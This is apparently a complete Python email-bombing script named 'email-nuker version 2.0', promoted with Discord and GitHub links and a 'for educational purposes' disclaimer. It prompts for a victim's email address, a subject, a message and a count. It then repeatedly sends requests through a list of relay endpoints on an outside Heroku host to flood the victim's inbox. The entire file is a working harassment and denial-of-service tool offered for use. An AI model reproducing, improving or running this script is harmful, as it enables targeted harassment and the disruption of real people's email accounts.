import requests
import random
import os 
import time

time.sleep(2)
os.system("clear")
print("\n")

print ("email-nuker version: 2.0")
print("join the official discord server of email-nuker\nall updates of email-nuker will be published here\ndiscord server join link: https://discord.gg/ndp64XbtPp\\n")
print ("github: https://github.com/bagarrattaa/email-nuker ")
print("this tool is only for educational purposes")

to=str(input("enter target email to bomb "))
sub=str(input("enter subject "))
msg=str(input("enter message "))
msg=msg.replace(" ","%20")
sub=sub.replace(" ","%20")
srvrlist={1:"https://gg-nuker.herokuapp.com/1",2:"https://gg-nuker.herokuapp.com/7",3:"https://gg-nuker.herokuapp.com/7",4:"https://gg-nuker.herokuapp.com/4",5:"https://gg-nuker.herokuapp.com/1",6:"https://gg-nuker.herokuapp.com/7",7:"https://gg-nuker.herokuapp.com/7",8:"https://gg-nuker.herokuapp.com/1",9:"https://gg-nuker.herokuapp.com/9",10:"https://gg-nuker.herokuapp.com/10",11:"https://gg-nuker.herokuapp.com/11",12:"https://gg-nuker.herokuapp.com/1",13:"https://gg-nuker.herokuapp.com/13",14:"https://gg-nuker.herokuapp.com/11",15:"https://gg-nuker.herokuapp.com/15",16:"https://gg-nuker.herokuapp.com/16",17:"https://gg-nuker.herokuapp.com/17",18:"https://gg-nuker.herokuapp.com/18",19:"https://gg-nuker.herokuapp.com/1",20:"https://gg-nuker.herokuapp.com/4",21:"https://gg-nuker.herokuapp.com/1"}

am=int(input("enter amount of msgs to send "))

if "/" in msg:
    print("Invalid charactors in message")
else:
    for i in range(0,am):
        srvr=random.randint(1,21)
        time.sleep(5)
        req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
        
        if req.text=="Sent": 
            print("           ")
            print (str(i+1)+" msgs sent")
        else:
            print ("failed to send msg ")
            print("please report this error to developer ")
            print("the responce reseaved from the server was: "+str(srvr)+req.text)
            break
